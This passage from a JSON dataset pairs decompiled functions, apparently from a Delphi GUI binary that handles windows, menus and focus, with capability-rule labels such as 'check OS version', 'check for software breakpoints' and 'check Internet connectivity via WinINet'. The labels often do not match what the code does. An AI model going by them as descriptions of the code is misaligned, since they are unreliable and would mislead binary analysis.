            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0045b758(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.00441fd4();\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0045b78c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t fcn.0045b78c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.0045fc80(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0045fc6c();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 183
    },
    "0045b7d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045b7d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.0045fc80(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.0045fc6c();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 199
    },
    "0045b93c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045b93c(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x45b9f1;\n                fcn.0045be34();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x45ba10;\n                fcn.0044e6dc();\n            }\n            uStack24 = 0x45baa4;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.0045bf64();\n                fcn.0044574c();\n            }\n            if (bVar3) {\n                fcn.0044a094();\n            }\n            if (param_2 == '\\x01') {\n                fcn.0045a7f4();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x45baab;\n            if (bVar3) {\n                uStack24 = 0x45baa3;\n                fcn.0044e6dc();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x45b996;\n            cVar1 = fcn.0044d568();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.0044d1c8(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x49179c), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 709
    },
    "0045bab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0045bab0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.0043a878();\n        }\n        uVar1 = fcn.0044d1c8();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.0044d1c8();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0045bb78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045bb78(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.0045fc80(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.0045fc6c();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.0045fc6c(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00406a50();\n                fcn.0040c5e8(arg_8h, arg_ch);\n                fcn.004047cc();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.0043e0ec();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.0041b5e0(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.0044d1c8(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.0044d1c8();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.0044d1c8();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.0044d1c8();\n            fcn.0043e0ec();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.0044d568(),  cVar1 != '\\0')) {\n        uVar4 = fcn.0044d1c8(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.0045d150();\n    }\n    fcn.0045bab0();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.0044d1c8(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.00446870(0);\n        fcn.00446870(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 1059
    },
    "0045bf64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.0045bf64(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "0045c000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c000(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.0044d1c8(*(param_2 * 4 + 0x4917a4));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0045c040": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045c040(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x496584 + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.0045b858();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x496588 + 0x68) != 0)) {\n            iVar10 = fcn.0045b858();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.00460bc4();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.0045b858();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.0045fc50();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.0045fc3c();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.0045fc50(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.0045fc3c(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.0045fc3c(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.0045f91c();\n                                fcn.0045fc3c(iVar4);\n                                iVar5 = fcn.0045f900();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.0045fc3c(iVar4 + iVar3);\n                                fcn.0045f8e8();\n                                fcn.0045fc3c();\n                                fcn.0045f934();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.0045fc3c(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.0045f91c();\n                                fcn.0045fc3c(iVar4);\n                                iVar5 = fcn.0045f900();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.0045fc3c(iVar4 + iVar3);\n                                fcn.0045f8e8();\n                                fcn.0045fc3c();\n                                fcn.0045f934();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.0045fc3c(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.0045f8e8();\n                                iVar4 = fcn.0045a384();\n                                fcn.0045fc3c();\n                                iVar5 = fcn.0045f8e8();\n                                fcn.0045fc3c();\n                                iVar7 = fcn.0045f8e8();\n                                fcn.0045fc3c();\n                                iVar8 = fcn.0045f934();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.0045fc3c();\n                                    fcn.0045f8e8();\n                                    fcn.0045fc3c();\n                                    fcn.0045f934();\n                                }\n                                fcn.0045fc3c();\n                                iVar3 = fcn.0045f91c();\n                                iVar4 = fcn.0045a3a4();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.0045fc3c();\n                                iVar4 = fcn.0045f91c();\n                                fcn.0045fc3c();\n                                iVar5 = fcn.0045f91c();\n                                fcn.0045fc3c();\n                                iVar7 = fcn.0045f900();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.0045fc3c();\n                                    uVar9 = fcn.0045f91c();\n                                    fcn.0045fc3c(uVar9);\n                                    fcn.0045f900();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1338
    },
    "0045c928": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c928(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x45ca51;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x496584 + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x496584 + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00406a50();\n            fcn.0040c5ac();\n            fcn.004047cc();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4957f4;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x496584 + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.004499e0();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.0045f2d4();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.00404da0(0x45ca58);\n    return;\n}\n",
        "token_count": 761
    },
    "0045caa4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045caa4(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    code *pcStack32;\n    uint *puStack28;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x1b4) != 0) {\n        if ((*(in_EAX + 0x32c) != 0) && (var_14h = *(*(in_EAX + 0x32c) + 8),  -1 < var_14h + -1)) {\n            var_8h = 0;\n            var_4h = in_EAX;\n            if ((*(in_EAX + 0x55) & 0x20) != 0) {\n                puStack28 = 0x45caff;\n                fcn.00414eec();\n                puStack28 = 0x45cb06;\n                fcn.0044e6dc();\n            }\n            pcStack32 = 0x45cb5c;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffdc;\n            puStack28 = &stack0xfffffffc;\n            piVar1 = fcn.00414eec();\n            (**(*piVar1 + 0xb0))();\n            *in_FS_OFFSET = uStack36;\n            puStack28 = 0x45cb63;\n            if ((*(var_4h + 0x55) & 0x20) != 0) {\n                pcStack32 = 0x45cb54;\n                fcn.00414eec();\n                pcStack32 = 0x45cb5b;\n                fcn.0044e6dc();\n            }\n            return;\n        }\n        var_10h = *(in_EAX + 0x1b4);\n        var_ch._0_1_ = (*(in_EAX + 0x55) & 0x20) != 0;\n        puStack28 = &fcn.0045caa4::var_10h;\n        pcStack32 = fcn.0045ca60;\n        uStack36 = 0x45cb96;\n        uStack36 = sub.kernel32.dll_GetCurrentThreadId_1();\n        sub.user32.dll_EnumThreadWindows();\n    }\n    fcn.00449e58();\n    return;\n}\n",
        "token_count": 561
    },
    "0045cc50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cc50(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45cd00;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (param_2 == *(in_EAX + 0x268)) goto code_r0x0045ccea;\n    puVar1 = &stack0xfffffffc;\n    if ((param_2 == 0) || (puVar1 = &stack0xfffffffc,  (*(in_EAX + 0x1c) & 0x10) != 0)) goto code_r0x0045ccc3;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX == param_2) {\ncode_r0x0045cca2:\n        puStack24 = puVar1;\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n        puVar1 = puStack24;\n    }\n    else {\n        iVar3 = fcn.004583e0();\n        puVar1 = puStack24;\n        if (in_EAX != iVar3) goto code_r0x0045cca2;\n        if ((*(in_EAX + 0x1c) & 1) == 0) {\n            cVar2 = fcn.00404154();\n            puVar1 = puStack24;\n            if (cVar2 == '\\0') goto code_r0x0045cca2;\n        }\n    }\ncode_r0x0045ccc3:\n    puStack24 = puVar1;\n    *(in_EAX + 0x268) = param_2;\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        if (*(in_EAX + 0x276) != '\\0') {\n            fcn.0045d024();\n        }\n        fcn.00404154();\n    }\ncode_r0x0045ccea:\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45cd07;\n    uStack28 = 0x45ccff;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 566
    },
    "0045cd7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045cd7c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint var_4h;\n    \n    *0x491740 = *0x491740 + 1;\n    if (*(in_EAX + 0x298) == 0) {\n        if (in_EAX == param_2) {\n            *(in_EAX + 0x268) = 0;\n        }\n        else {\n            *(in_EAX + 0x268) = param_2;\n        }\n    }\n    *(*0x496588 + 100) = param_2;\n    *(*0x496588 + 0x68) = in_EAX;\n    fcn.00415088();\n    fcn.00414f68();\n    cVar2 = fcn.004040e4();\n    if (cVar2 == '\\0') {\n        *(*0x496588 + 0x6c) = 0;\n    }\n    else {\n        *(*0x496588 + 0x6c) = in_EAX;\n        fcn.00415088();\n        fcn.00414f68();\n    }\n    if ((*(param_2 + 0x54) & 0x20) != 0) {\n        return 0;\n    }\n    *(param_2 + 0x54) = *(param_2 + 0x54) | *0x45d01c;\n    iVar4 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (in_EAX != *(*0x496588 + 0x78)) {\n        if (*(*0x496588 + 0x78) != 0) {\n            fcn.0044d1c8();\n            *(*0x496588 + 0x78) = 0;\n            cVar2 = fcn.004581a0();\n            if (cVar2 == '\\0') {\n                fcn.00404878();\n                return 0;\n            }\n        }\n        *(*0x496588 + 0x78) = in_EAX;\n        fcn.0044d1c8();\n        cVar2 = fcn.004581a0();\n        if (cVar2 == '\\0') {\n            fcn.00404878();\n            return 0;\n        }\n    }\n    if (*(in_EAX + 0x26c) == 0) {\n        *(in_EAX + 0x26c) = in_EAX;\n    }\n    if (*(in_EAX + 0x26c) != param_2) {\n        while ((*(in_EAX + 0x26c) != 0 && (cVar2 = fcn.004492c0(),  cVar2 == '\\0'))) {\n            fcn.0044d1c8();\n            *(in_EAX + 0x26c) = *(*(in_EAX + 0x26c) + 0x30);\n            cVar2 = fcn.004581a0();\n            if (cVar2 == '\\0') {\n                fcn.00404878();\n                return 0;\n            }\n        }\n        while (iVar4 = param_2,  *(in_EAX + 0x26c) != param_2) {\n            do {\n                iVar3 = iVar4;\n                iVar4 = *(iVar3 + 0x30);\n            } while (iVar4 != *(in_EAX + 0x26c));\n            *(in_EAX + 0x26c) = iVar3;\n            fcn.0044d1c8();\n            cVar2 = fcn.004581a0();\n            if (cVar2 == '\\0') {\n                fcn.00404878();\n                return 0;\n            }\n        }\n        piVar1 = *(param_2 + 0x30);\n        if ((*(param_2 + 0x1c) & 0x10) == 0) {\n            for (; piVar1 != NULL; piVar1 = piVar1[0xc]) {\n                cVar2 = fcn.004040e4();\n                if (cVar2 != '\\0') {\n                    (**(*piVar1 + 0xdc))();\n                }\n            }\n        }\n        fcn.00446870(param_2);\n        if ((*(in_EAX + 0x2c4) != 0) && (*(in_EAX + 0x2c4) != param_2)) {\n            iVar4 = 0;\n            fcn.00446870(0);\n        }\n    }\n    *in_FS_OFFSET = iVar4;\n    *(param_2 + 0x54) = ~*0x45d01c & *(param_2 + 0x54);\n    return param_2;\n}\n",
        "token_count": 1092
    },
    "0045d024": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045d024(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if ((((*(in_EAX + 0x268) == 0) || (*(in_EAX + 0x298) != 0)) && (*(in_EAX + 0x30) != 0)) && (*(in_EAX + 0x298) == 0))\n    {\n        fcn.0044d68c(0, 1);\n    }\n    uVar1 = fcn.0044d1c8();\n    sub.user32.dll_SetFocus(uVar1);\n    iVar2 = fcn.0044d1c8();\n    iVar3 = sub.user32.dll_GetFocus();\n    if (iVar2 == iVar3) {\n        fcn.00446870(0);\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "0045d100": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d100(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(in_EAX + 0x276) != '\\0') && (*(in_EAX + 0x268) != 0)) {\n        fcn.00446870(param_2);\n    }\n    if (*(in_EAX + 0x277) == '\\x02') {\n        iVar1 = fcn.0045b758();\n        if (iVar1 != 0) {\n            fcn.0045b758();\n            fcn.0045d100();\n        }\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0045d150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d150(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (((((*(in_EAX + 0x358) & 8) == 0) && (*(*0x496584 + 0x44) != 0)) && (*(*(*0x496584 + 0x44) + 0x290) != 0)) &&\n       ((in_EAX != *(*0x496584 + 0x44) && ((*(in_EAX + 0x277) == '\\x01' || (*(*(*0x496584 + 0x44) + 0x277) != '\\x02'))))\n       )) {\n        if (param_2 == '\\0') {\n            fcn.0043e734();\n        }\n        else {\n            fcn.0043e718();\n        }\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0045d2e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0045d2e0(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45d2f9;\n    fcn.00421928();\n    uStack24 = 0x45d38e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x45d317;\n    puStack20 = &stack0xfffffffc;\n    fcn.00421d14();\n    uStack36 = 0x45d36b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (*(in_EAX + 0x298) == 0) {\n        puStack32 = &stack0xfffffffc;\n        fcn.00404154();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        (**(**(in_EAX + 0x298) + 0x28))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x45d372;\n    uStack36 = 0x45d36a;\n    fcn.00421d14();\n    return;\n}\n",
        "token_count": 323
    },
    "0045d594": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
